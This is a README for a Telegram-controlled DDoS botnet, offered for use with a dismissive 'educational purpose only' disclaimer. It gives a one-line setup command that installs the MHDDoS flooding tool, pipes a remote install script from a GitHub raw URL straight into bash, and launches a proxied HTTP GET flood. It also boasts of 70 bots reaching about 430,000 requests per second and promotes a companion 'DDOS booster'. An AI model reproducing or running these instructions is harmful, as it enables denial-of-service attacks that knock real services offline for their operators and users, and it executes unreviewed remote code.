# DDOS Botnet Sample

DDOS BotNet for telegram, just make differents version of this bot with differents telegram token (in .env file pls).

And host it ! (I use [GLITCH](https://glitch.com/dashboard) for simple and free host)
<br><br>
## How use it ?

Just clone the repo on your hosting server, make a .env file with a TELEGRAM_TOKEN variable with your telegram token key, 
and make a NUM variable with the name of the bot.
<br><br>
In the shell of your hosting server make this config command : 
<br>
` /usr/bin/python3 -m pip install --upgrade pip && pip3 uninstall telegram && pip3 uninstall telegram-bot python-telegram-bot && pip3 install -r requirements.txt &&git clone https://github.com/MatrixTM/MHDDoS.git && cd MHDDoS && pip3 install -r requirements.txt && curl -s https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/scripts/python_git_MHDDoS_proxy_install.sh | bash && python3 ~/MHDDoS/start.py GET example.com 1 100 mhddos_proxy/list 100 5 `
<br>
Now hit the URL of the bot for start (only if your hosting sleep your project in free mode like Glitch), you can also make a bot for start all other bot. 


The installation tutorial is not finished, if you have any problems I can help you.

<br><br>
[+] NEW ! You can now upgrade your requests/s using my [DDOS BOOSTER !](https://github.com/Mehliug-git/DDOS_Booster) It's just a DDOS bot without Telegram, just get a URL and start DDOS !    
<br>
[+] NEW ! : If you just want to test your infrastrucutre open me an Issue and have done this together !!

**In my Botnet I have actually 70 bots, I can go up to ~ 430 000 requests /s**
<br><br>

### Just for educational purpose only, Do, what you want I don’t give a fuck, but it’s not my fault you’re in trouble.
